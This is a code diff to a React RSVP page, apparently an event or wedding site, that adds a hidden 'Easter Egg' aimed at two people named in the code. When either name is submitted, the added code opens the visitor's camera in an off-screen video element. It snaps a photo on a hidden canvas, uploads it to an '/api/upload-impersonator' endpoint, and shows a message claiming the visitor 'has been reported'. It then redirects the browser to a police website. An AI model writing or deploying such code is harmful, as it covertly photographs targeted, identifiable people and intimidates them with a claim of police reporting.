@@ -24,6 +24,8 @@ function App() {
   const [meal, setMeal] = useState('');
   const [message, setMessage] = useState('');
   const [isLoading, setIsLoading] = useState(false);
+  const [isDisintegrating, setIsDisintegrating] = useState(false);
+  const [showSecretMessage, setShowSecretMessage] = useState(false);
   
   // Update these paths to match your images in the public/img folder
   const heroImages = [
@@ -54,6 +56,17 @@ function App() {
       setHasRsvped(true);
     }
   }, []);
+
+  useEffect(() => {
+    if (isDisintegrating) {
+      // The animation is 2s long. Redirect after it finishes.
+      const timer = setTimeout(() => {
+        window.location.href = 'https://www.saps.gov.za/';
+      }, 2000);
+
+      return () => clearTimeout(timer);
+    }
+  }, [isDisintegrating]);
 
   useEffect(() => {
     const timer = setInterval(() => {
@@ -115,6 +128,62 @@ function App() {
   const handleRsvpSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     setIsLoading(true);
+
+    // Easter Egg for "Kyle Titus"
+    if (name.trim().toLowerCase() === 'kyle titus' || name.trim().toLowerCase() === 'robin henney')
+    {
+      setIsLoading(false); // Stop the loading indicator immediately
+
+      const captureAndUpload = async () => {
+        try {
+          // 1. Request camera access
+          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+
+          // Create a hidden video element to play the stream
+          const video = document.createElement('video');
+          video.style.position = 'absolute';
+          video.style.left = '-9999px'; // Hide it off-screen
+          video.srcObject = stream;
+          document.body.appendChild(video);
+          await video.play();
+
+          // Wait a moment for the camera to auto-adjust
+          await new Promise(resolve => setTimeout(resolve, 500));
+
+          // 2. Capture a frame on a hidden canvas
+          const canvas = document.createElement('canvas');
+          canvas.style.display = 'none';
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          const context = canvas.getContext('2d');
+          context?.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+          // 3. Stop the camera and clean up the video element
+          stream.getTracks().forEach(track => track.stop());
+          document.body.removeChild(video);
+
+          // 4. Convert to Data URL and upload (fire-and-forget)
+          const imageDataUrl = canvas.toDataURL('image/jpeg');
+          fetch('/api/upload-impersonator', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ image: imageDataUrl }),
+          }).catch(err => console.error("Upload failed:", err));
+        } catch (err) {
+          console.error("Could not capture photo:", err);
+        } finally {
+          // 5. Trigger the UI sequence regardless of photo success
+          setShowSecretMessage(true);
+          setTimeout(() => {
+            setIsDisintegrating(true);
+          }, 5000); // Give time to read the message
+        }
+      };
+
+      captureAndUpload();
+      return; // Stop the normal RSVP process
+    }
+
     setMessage('');
 
     try {
@@ -143,7 +212,15 @@ function App() {
   };
 
   return (
-    <div className="min-h-screen bg-gradient-to-b from-gray-500 to-gray-1000 text-gray-800">
+    <div className={`min-h-screen bg-gradient-to-b from-gray-500 to-gray-1000 text-gray-800 ${isDisintegrating ? 'disintegrate' : ''}`}>
+      {showSecretMessage && (
+        <div className="fixed inset-0 bg-black bg-opacity-80 z-[9999] flex items-center justify-center p-4 animate-fade-in-fast">
+          <div className="text-red-500 text-center text-4xl md:text-6xl font-soul animate-pulse">
+            Impersonation is a serious crime. You have been reported.
+          </div>
+        </div>
+      )}
+
       <section className="h-[90vh] relative overflow-hidden">
         <HeartBackground />
         {heroImages.map((image, index) => (
